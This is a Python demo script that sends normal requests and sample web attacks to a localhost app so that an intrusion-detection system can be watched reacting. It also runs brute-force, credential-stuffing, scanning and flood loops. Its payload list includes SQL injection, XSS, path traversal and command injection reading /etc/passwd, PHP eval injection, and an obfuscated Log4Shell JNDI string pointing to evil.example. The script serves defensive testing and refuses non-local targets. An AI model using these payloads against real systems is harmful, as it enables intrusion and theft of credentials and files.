"""Send sample attacks to the LOCAL demo app so you can watch the IDS react.

Only localhost targets are allowed. Do not point this at sites you do not own.

    python scripts/attack.py                 # normal requests + one of each payload attack
    python scripts/attack.py --everything    # also brute force, stuffing, scanning and a flood
    python scripts/attack.py --brute 8       # 8 failed logins, same username
    python scripts/attack.py --stuff 8       # 8 failed logins, 8 different usernames
    python scripts/attack.py --scan 20       # 20 requests for pages that do not exist
    python scripts/attack.py --flood 150     # 150 requests as fast as possible

Tip: run it in detect mode first. In block mode an IP that triggers a behavior
alert is blocked for 2 minutes, so later steps of this script get 429.
"""
import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

q = urllib.parse.quote

CASES = [
    # label,                       method, path,                                              body,                                        headers
    ("normal search",              "GET",  "/search?q=" + q("red running shoes"),             None,                                        {}),
    ("normal name with apostrophe", "GET", "/search?q=" + q("O'Brien"),                       None,                                        {}),
    ("normal login attempt",       "POST", "/login",                                          {"username": "demo", "password": "demo123"}, {}),
    ("SQLi: boolean trick",        "GET",  "/search?q=" + q("' OR '1'='1"),                   None,                                        {}),
    ("SQLi: union select",         "GET",  "/search?q=" + q("1 UNION SELECT username,password FROM users"), None,                      {}),
    ("SQLi: login bypass",         "POST", "/login",                                          {"username": "admin'--", "password": "x"},   {}),
    ("SQLi: time based",           "GET",  "/search?q=" + q("1' AND SLEEP(5)--"),             None,                                        {}),
    ("XSS: script tag",            "GET",  "/search?q=" + q("<script>alert(1)</script>"),     None,                                        {}),
    ("XSS: event handler",         "GET",  "/search?q=" + q("<img src=x onerror=alert(1)>"),  None,                                        {}),
    ("Path traversal",             "GET",  "/files?name=" + q("../../../etc/passwd"),         None,                                        {}),
    ("Path traversal (encoded)",   "GET",  "/files?name=..%2f..%2f..%2fetc%2fpasswd",         None,                                        {}),
    ("Command injection",          "GET",  "/ping?host=" + q("127.0.0.1; cat /etc/passwd"),   None,                                        {}),
    ("PHP code injection",         "GET",  "/search?q=" + q("eval(base64_decode('ZWNobyAx'))"), None,                                      {}),
    ("Log4Shell (obfuscated)",     "GET",  "/search?q=" + q("${${lower:j}ndi:${lower:l}dap://evil.example/a}"), None,                    {}),
    ("Template injection",         "GET",  "/search?q=" + q("{{7*7}}"),                       None,                                        {}),
    ("NoSQL injection",            "POST", "/login",                                          {"username": {"$ne": None}, "password": {"$ne": None}}, {}),
    ("CRLF header injection",      "GET",  "/search?q=a%0d%0aSet-Cookie:%20admin=1",          None,                                        {}),
    ("Sensitive file probe",       "GET",  "/.env",                                           None,                                        {}),
    ("Scanner tool user-agent",    "GET",  "/",                                               None,                                        {"User-Agent": "sqlmap/1.7.2"}),
]


def send(base, method, path, body, headers):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as e:
        return f"ERROR ({e.reason})"


def summarize(label, codes):
    counts = {}
    for c in codes:
        counts[c] = counts.get(c, 0) + 1
    print(f"{label}: " + ", ".join(f"{n} x {c}" for c, n in sorted(counts.items(), key=str)))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--brute", type=int, default=0, help="failed logins with ONE username")
    parser.add_argument("--stuff", type=int, default=0, help="failed logins with DIFFERENT usernames")
    parser.add_argument("--scan", type=int, default=0, help="requests for pages that do not exist")
    parser.add_argument("--flood", type=int, default=0, help="requests as fast as possible")
    parser.add_argument("--everything", action="store_true", help="payload attacks + all behavior attacks")
    parser.add_argument("--no-cases", action="store_true", help="skip the single payload attacks")
    parser.add_argument("--delay", type=float, default=0.3, help="seconds between payload attacks")
    args = parser.parse_args()
    if args.everything:
        args.brute, args.stuff, args.scan, args.flood = 8, 8, 20, 150

    host = urllib.parse.urlparse(args.base).hostname
    if host not in ("127.0.0.1", "localhost"):
        sys.exit("Refusing to attack anything except localhost.")

    if not args.no_cases:
        for label, method, path, body, headers in CASES:
            print(f"{str(send(args.base, method, path, body, headers)):>5}  {label}")
            time.sleep(args.delay)

    if args.brute:
        summarize(f"\nBrute force ({args.brute} failed logins, one username)", [
            send(args.base, "POST", "/login", {"username": "demo", "password": f"guess{i}"}, {})
            for i in range(args.brute)])
    if args.stuff:
        summarize(f"Credential stuffing ({args.stuff} different usernames)", [
            send(args.base, "POST", "/login", {"username": f"victim{i}@example.com", "password": "Summer2024!"}, {})
            for i in range(args.stuff)])
    if args.scan:
        summarize(f"Scanning ({args.scan} missing pages)", [
            send(args.base, "GET", f"/admin-{i}.php", None, {}) for i in range(args.scan)])
    if args.flood:
        summarize(f"Flood ({args.flood} fast requests)", [
            send(args.base, "GET", "/search?q=hello", None, {}) for _ in range(args.flood)])


if __name__ == "__main__":
    main()
